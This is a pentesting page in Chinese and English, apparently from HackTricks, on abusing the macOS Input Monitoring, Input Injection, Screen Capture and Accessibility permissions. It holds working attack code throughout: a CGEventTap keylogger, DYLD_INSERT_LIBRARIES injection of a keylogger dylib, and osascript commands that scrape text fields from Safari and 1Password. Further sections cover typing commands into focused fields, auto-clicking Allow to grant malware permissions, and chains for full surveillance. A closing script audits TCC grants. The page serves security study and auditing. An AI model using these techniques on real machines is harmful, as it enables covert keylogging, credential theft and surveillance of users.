# macOS Input Monitoring、Screen Capture 与 Accessibility Abuse

{{#include ../../../banners/hacktricks-training.md}}

## 概述

三个相关的 TCC service 控制 applications 如何观察和交互用户的 desktop session：

| TCC Service | Permission | Capability |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | 在整个 system-wide 读取所有 keyboard 和 mouse events（keylogging） |
| `kTCCServicePostEvent` | **Input Injection** | 注入 synthetic keyboard 和 mouse events |
| `kTCCServiceScreenCapture` | **Screen Capture** | 读取 display buffer、take screenshots、record screen |
| `kTCCServiceAccessibility` | **Accessibility** | 通过 AXUIElement API 控制其他 applications，读取 UI elements |

这些 permissions 是 macOS 上**最危险的组合**——结合起来可以提供：
- 对每次 keystroke 进行完整 keylogging（passwords、messages、credit cards）
- 记录所有可见内容的 screen
- synthetic input injection（click buttons、approve dialogs）
- 等同于 physical access 的完整 GUI control

---

## Input Monitoring（kTCCServiceListenEvent）

### 工作原理

macOS 使用 **`CGEventTap` API**，允许 processes 从 Quartz event system 中 intercept input events。拥有 ListenEvent permission 的 process 可以创建 event tap，在每个 keyboard 和 mouse event 到达目标 application 之前或之后接收它们。<sup>[1]</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### 查找具有 Entitlements 的二进制文件
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: 通过 Code Injection 进行 Keylogging

如果某个 binary 具有 ListenEvent permission，同时还**禁用了 library validation**或**允许 DYLD environment variables**，攻击者就可以注入一个注册 CGEventTap 的 dylib：
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
注入的 dylib 继承目标的 ListenEvent TCC 授权，并捕获所有按键。

### 攻击：Credential Harvesting

复杂的 keylogger 可以将按键与当前活动应用程序关联起来：
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### 工作原理

PostEvent permission 允许使用 **`kCGEventTapOptionDefault`**（可以修改/注入 events）创建 event tap，而不是 ListenOnly。<sup>[1]</sup>这使得以下操作成为可能：
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### 攻击：自动批准 TCC 提示

使用 PostEvent，攻击者可以**模拟点击 TCC 权限对话框中的“允许”**：
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## 屏幕捕获 (kTCCServiceScreenCapture)

### 工作原理

屏幕捕获权限允许通过以下方式读取显示缓冲区：
- **`CGWindowListCreateImage`** — 捕获任意窗口或整个屏幕
- **`ScreenCaptureKit`** (macOS 12.3+) — 用于流式传输屏幕内容的现代 API<sup>[3]</sup>
- **`CGDisplayStream`** — 硬件加速的屏幕捕获
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### 查找屏幕捕获客户端
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### 攻击：通过 OCR 捕获凭据

注入的 screen capture 进程可以定期捕获画面，并使用 OCR 提取密码：
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> 从 **macOS Sonoma** 开始，屏幕捕获会在菜单栏中显示一个**持久指示器**。在较旧版本中，屏幕录制可能完全静默。不过，短暂的单帧捕获仍可能不会被用户察觉。

### Attack: Session Recording

持续的屏幕录制可完整重放用户的会话：
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## 辅助功能（kTCCServiceAccessibility）

### 工作原理

辅助功能访问权限通过 **AXUIElement API** 授予对其他应用程序的控制权。<sup>[2]</sup>拥有辅助功能权限的进程可以：

1. **读取**任何应用程序中的 UI 元素（文本字段、标签、按钮、菜单）
2. **点击**按钮并与控件交互
3. **输入**文本到任何文本字段中
4. **浏览**菜单和对话框
5. **抓取**任何正在运行的应用程序中显示的数据
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### 攻击：自行授予 TCC 权限

最危险的辅助功能滥用方式是**导航 System Settings，为自己的 malware 授予额外权限**：
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### 攻击：跨应用数据抓取
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### 攻击：自动化用户操作
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## 攻击链

### 攻击链：Input Monitoring + Screen Capture = 完整监控
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Chain: Accessibility + PostEvent = 完全远程控制
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### 链：Accessibility → Self-Grant Camera/Mic → Surveillance
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## 检测与枚举
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## 参考资料

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
